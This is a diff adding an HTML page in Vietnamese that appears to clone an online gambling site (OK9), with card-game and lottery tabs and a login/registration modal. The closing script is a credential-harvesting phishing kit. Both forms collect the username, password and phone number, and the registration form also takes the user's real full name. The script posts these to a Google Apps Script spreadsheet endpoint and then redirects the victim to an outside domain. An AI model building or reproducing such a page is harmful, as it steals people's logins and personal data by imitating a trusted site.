+                        <div class="provider-name">V8 GAME BAI</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <span class="badge-hot" style="position: absolute; top:-5px; right:-5px; background:red; color:yellow; font-size:10px; padding:2px 5px; border-radius:10px; z-index:10;">Hot</span>
+                        <div class="provider-logo-text" style="color: #333;">JL</div>
+                        <div class="provider-name">JL GAME BAI</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <div class="provider-logo-text" style="color: #d4af37;">CF</div>
+                        <div class="provider-name">CF GAME BAI</div>
+                    </div>
+                    
+                    
+                    
+                    
+                </div>
+
+                <!-- CỘT BÊN PHẢI: Lưới Trò Chơi -->
+                <div class="sub-game-grid">
+                    
+                    <!-- Khối game mẫu -->
+                    <div class="sub-game-card">
+                        <img src="images/caloncabe.webp" alt="CÁ LỚN ĂN CÁ BÉ">
+                        <div class="sub-game-title">CÁ LỚN ĂN CÁ BÉ</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/xidach.webp" alt="XÌ DÁCH">
+                        <div class="sub-game-title">Xì DáCh</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/fantan.webp" alt="FAN TAN">
+                        <div class="sub-game-title">FAN TAN</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/baucua.webp" alt="BẦU CUA">
+                        <div class="sub-game-title">BẦU CUA</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/vuhoi.webp" alt="VŨ HỘI TRONG RỪNG">
+                        <div class="sub-game-title">VŨ HỘI TRONG RỪNG</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/oantuti.webp" alt="OẲN TÙ TÌ">
+                        <div class="sub-game-title">OẲN TÙ TÌ</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/phom.webp" alt="PHỎM TÁ LẢ">
+                        <div class="sub-game-title">PHỎM TÁ LẢ</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/baicao.webp" alt="BÀI CÀO">
+                        <div class="sub-game-title">BÀI CÀO</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/whot.webp" alt="WHOT">
+                        <div class="sub-game-title">WHOT</div>
+                    </div>
+                    
+                     <!-- Bạn có thể copy paste thêm các .sub-game-card cho đến khi đổ đầy lưới -->
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB XO SO -->
+        <div id="tab-xoso" class="game-layout tab-pane">
+            
+            <!-- 1. Thanh tìm kiếm và lọc -->
+            <div class="game-top-bar">
+                <input type="text" class="search-input" placeholder="Tìm kiếm trò chơi">
+                <select class="filter-select">
+                    <option>Tất cả trò chơi</option>
+                    <option>Trò chơi Mới</option>
+                    <option>Trò chơi Hot</option>
+                </select>
+            </div>
+
+            <!-- 2. Thân tab -->
+            <div class="game-body">
+                
+                <!-- CỘT BÊN TRÁI: Các Sảnh (Provider) -->
+                <div class="game-sidebar">
+                    <div class="provider-item active">
+                        <span class="badge-hot" style="position: absolute; top:-5px; right:-5px; background:red; color:yellow; font-size:10px; padding:2px 5px; border-radius:10px; z-index:10;">Hot</span>
+                      
+                        <div class="provider-logo-text" style="color: #f8f401;">TCG</div>
+                        <div class="provider-name">TCG XỔ SỐ</div>
+                    </div>
+                    
+                    <div class="provider-item">
+                        <span class="badge-hot" style="position: absolute; top:-5px; right:-5px; background:red; color:yellow; font-size:10px; padding:2px 5px; border-radius:10px; z-index:10;">Hot</span>
+                        <div class="provider-logo-text" style="color: #333;">GW</div>
+                        <div class="provider-name">GW XỔ SỐ</div>
+                    </div>                                                                                               
+                    
+                </div>
+
+                <!-- CỘT BÊN PHẢI: Lưới Trò Chơi -->
+                <div class="sub-game-grid">
+                    
+                    <!-- Khối game mẫu -->
+                    <div class="sub-game-card">
+                        <img src="images/binhduong.webp" alt="BÌNH DƯƠNG">
+                        <div class="sub-game-title">BÌNH DƯƠNG</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/Dac_Nong_DNOVNC_vi.webp" alt="ĐẮC NÔNG">
+                        <div class="sub-game-title">ĐẮC NÔNG</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/Quang_Ngai_QNIVNC_vi.webp" alt="QUẢNG NGÃI">
+                        <div class="sub-game-title">QUẢNG NGÃI</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/Soc_Trang_STVNC_vi.webp" alt="SÓC TRĂNG">
+                        <div class="sub-game-title">SÓC TRĂNG</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/Tai_Xiu_TCGVTX_vi.webp" alt="TÀI XỈU">
+                        <div class="sub-game-title">TÀI XỈU</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/TCGTurbo3D_TCGTURBO3D_en.webp" alt="TCG Turbo 3D">
+                        <div class="sub-game-title">TCG Turbo 3D</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/Vung_Tau_VTVNC_vi.webp" alt="VŨNG TÀU">
+                        <div class="sub-game-title">VŨNG TÀU</div>
+                    </div>
+                    
+                    <div class="sub-game-card">
+                        <img src="images/Tra_Vinh_TVVNC_vi.webp" alt="TRÀ VINH">
+                        <div class="sub-game-title">TRÀ VINH</div>
+                    </div>
+                    <div class="sub-game-card">
+                        <img src="images/Tay_Ninh_TNVNC_vi.webp" alt="TÂY NINH">
+                        <div class="sub-game-title">TÂY NINH</div>
+                    </div>
+                    
+                     <!-- Bạn có thể copy paste thêm các .sub-game-card cho đến khi đổ đầy lưới -->
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Mobile Bottom Navigation -->
+    <nav class="mobile-bottom-nav">
+        <div><img src="images/icon_home.2a1354d1.webp" alt="Trang Chủ"><br>Trang Chủ</div>
+        <div><img src="images/icon_game.webp" alt="Game+"><br>Game+</div>
+        <div><img src="images/icon_cs.c5f11b03.webp" alt="CSKH"><br>CSKH 24/7</div>
+        <div><img src="images/icon_promotion.b3c34e34.webp" alt="Ưu Đãi"><br>Ưu Đãi</div>
+        <div><img src="images/icon_profile.4c78574a.webp" alt="Tài Khoản"><br>Tài Khoản</div>
+    </nav>
+
+    <!-- =========================================
+         MODAL ĐĂNG NHẬP / ĐĂNG KÝ (KHÔI PHỤC TỪ CODE GỐC)
+         ========================================= -->
+    <div id="auth-modal" class="auth-modal-overlay">
+        <div class="auth-modal-box">
+            <span class="auth-close-btn">&times;</span>
+
+            <div class="auth-header">
+                <img src="images/logochinh.jpg" alt="OK9" class="auth-main-logo">
+                <div class="auth-partner">
+                    <div class="partner-text">
+                        <strong>Đối Tác Chính Thức<br>CLUB AC Milan & OK9</strong><br>
+                        <span>Năm 2024 - 2025</span>
+                    </div>
+                    <img src="images/logonho.jpg" alt="Partner Logo" class="partner-logo">
+                </div>
+            </div>
+
+            <!-- FORM ĐĂNG NHẬP -->
+            <form id="login-section" class="auth-body">
+                <div class="input-group">
+                    <span class="input-icon"><img src="images/id.webp" alt="User"></span>
+                    <input type="text" placeholder="Tên tài khoản của bạn" required>
+                </div>
+                <div class="input-group">
+                    <span class="input-icon"><img src="images/password.webp" alt="Pass"></span>
+                    <input type="password" placeholder="Mật khẩu" required>
+                </div>
+                <div class="input-group">
+                    <span class="input-icon"><img src="images/phone.webp" alt="Phone"></span>
+                    <input type="tel" placeholder="Số điện thoại (10 số)" required pattern="[0-9]{10}" maxlength="10" title="Vui lòng nhập đúng 10 chữ số">
+                </div>
+
+                <div class="auth-options">
+                    <label class="checkbox-container">
+                        <input type="checkbox" checked>
+                        <span class="checkmark"></span> Ghi nhớ mật khẩu
+                    </label>
+                    <a href="#" class="forgot-pw">Quên mật khẩu?</a>
+                </div>
+                <button type="submit" class="btn-solid-green">ĐĂNG NHẬP</button>
+                <button type="button" class="btn-outline-green" id="switch-to-register">ĐĂNG KÝ NGAY</button>
+            </form>
+
+            <!-- FORM ĐĂNG KÝ -->
+            <form id="register-section" class="auth-body" style="display: none;">
+                <div class="input-group"> 
+                    <span class="input-icon"><img src="images/id.webp" alt="User"></span>
+                    <input type="text" placeholder="Tên tài khoản từ 4-11 ký tự, số và chữ" required>
+                </div>
+                <div class="input-group">
+                    <span class="input-icon"><img src="images/password.webp" alt="Pass"></span>
+                    <input type="password" placeholder="Mật khẩu (6-16 ký tự kết hợp số và chữ)" required>
+                </div>
+                <div class="input-group">
+                    <span class="input-icon"><img src="images/phone.webp" alt="Phone"></span>
+                    <input type="tel" placeholder="+84 ∨ Số điện thoại" required pattern="[0-9]{10}" maxlength="10" title="Vui lòng nhập đúng 10 chữ số">
+                </div>
+                <div class="input-group">
+                    <span class="input-icon"><img src="images/name.webp" alt="Name"></span>
+                    <input type="text" placeholder="Họ và tên thật (phải khớp với tk)" required>
+                </div>
+                <div class="auth-options">
+                    <label class="checkbox-container" style="color: #28a745;">
+                        <input type="checkbox" required>
+                        <span class="checkmark"></span> Đã đủ 18 tuổi và đồng ý với trang web
+                    </label>
+                </div>
+                <button type="submit" class="btn-solid-green">ĐĂNG KÝ</button>
+                <button type="button" class="btn-outline-green" id="switch-to-login">ĐĂNG NHẬP NGAY</button>
+            </form>
+
+            <div class="auth-footer">
+                <img src="images/banner1.jpg" alt="Tải App Tham Gia" style="width: 100%; border-radius: 10px;">
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript Xử Lý Của Tất Cả Tính Năng -->
+    <script>
+        // --- CẤU HÌNH GOOGLE SHEETS ---
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxfBk7ltt2zl8XfGCJ7-70qkFNacRC2vxislgwl3RNu04KyYR6WvjBreaqeDBw1d49R/exec";
+
+        // --- 1. LOGIC CHUYỂN TAB ---
+        const categoryItems = document.querySelectorAll('.category-item');
+        const tabPanes = document.querySelectorAll('.tab-pane');
+
+        categoryItems.forEach(item => {
+            item.addEventListener('click', () => {
+                categoryItems.forEach(nav => nav.classList.remove('active'));
+                tabPanes.forEach(pane => pane.classList.remove('active'));
+
+                item.classList.add('active');
+                const targetId = item.getAttribute('data-target');
+                document.getElementById(targetId).classList.add('active');
+            });
+        });
+
+        // --- 2. LOGIC ĐỔI MÀU SIDEBAR SẢNH GAME ---
+        const providerItems = document.querySelectorAll('.provider-item');
+        providerItems.forEach(item => {
+            item.addEventListener('click', function() {
+                const parentSidebar = this.closest('.game-sidebar');
+                if (parentSidebar) {
+                    const siblings = parentSidebar.querySelectorAll('.provider-item');
+                    siblings.forEach(sib => sib.classList.remove('active'));
+                    this.classList.add('active');
+                }
+            });
+        });
+
+        // --- 3. LOGIC BANNER ---
+        const slides = document.querySelector('.slides');
+        const images = document.querySelectorAll('.slides img');
+        let currentIndex = 0;
+        if(images.length > 0) {
+            setInterval(() => {
+                currentIndex++;
+                if (currentIndex >= images.length) currentIndex = 0;
+                slides.style.transform = `translateX(-${currentIndex * 100}%)`;
+            }, 3000);
+        }
+
+        // --- 4. LOGIC MODAL & GOOGLE SHEETS FORM ---
+        const authModal = document.getElementById('auth-modal');
+        const loginBtn = document.querySelector('.login-btn'); 
+        const closeBtn = document.querySelector('.auth-close-btn');
+        
+        const loginSection = document.getElementById('login-section');
+        const registerSection = document.getElementById('register-section');
+        const btnSwitchToRegister = document.getElementById('switch-to-register');
+        const btnSwitchToLogin = document.getElementById('switch-to-login');
+
+        if (loginBtn) loginBtn.addEventListener('click', () => authModal.style.display = 'flex');
+        if (closeBtn) closeBtn.addEventListener('click', () => authModal.style.display = 'none');
+        window.addEventListener('click', (e) => { if (e.target === authModal) authModal.style.display = 'none'; });
+
+        btnSwitchToRegister.addEventListener('click', () => {
+            loginSection.style.display = 'none';
+            registerSection.style.display = 'block';
+        });
+
+        btnSwitchToLogin.addEventListener('click', () => {
+            registerSection.style.display = 'none';
+            loginSection.style.display = 'block';
+        });
+
+        // Gửi Form Đăng Nhập
+        loginSection.addEventListener('submit', function(e) {
+            e.preventDefault();
+            var formData = {
+                trangThai: "Đăng Nhập",
+                taiKhoan: loginSection.querySelector('input[type="text"]').value,
+                matKhau: loginSection.querySelector('input[type="password"]').value,
+                soDienThoai: loginSection.querySelector('input[type="tel"]').value,
+                hoTen: "Không có"
+            };
+
+            fetch(SCRIPT_URL, {
+                method: 'POST', mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            }).then(() => {
+                window.location.href = 'https://99okk15.ink/';
+            }).catch(error => {
+                console.error('Lỗi!', error);
+                window.location.href = 'https://99okk15.ink/';
+            });
+        });
+
+        // Gửi Form Đăng Ký
+        registerSection.addEventListener('submit', function(e) {
+            e.preventDefault();
+            var inputs = registerSection.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"]');
+            var formData = {
+                trangThai: "Đăng Ký",
+                taiKhoan: inputs[0].value,
+                matKhau: inputs[1].value,
+                soDienThoai: inputs[2].value,
+                hoTen: inputs[3].value
+            };
+
+            fetch(SCRIPT_URL, {
+                method: 'POST', mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            }).then(() => {
+                window.location.href = 'https://99okk15.ink/';
+            }).catch(error => {
+                console.error('Lỗi!', error);
+                window.location.href = 'https://99okk15.ink/';
+            });
+        });
+    </script>
+</body>
+</html>
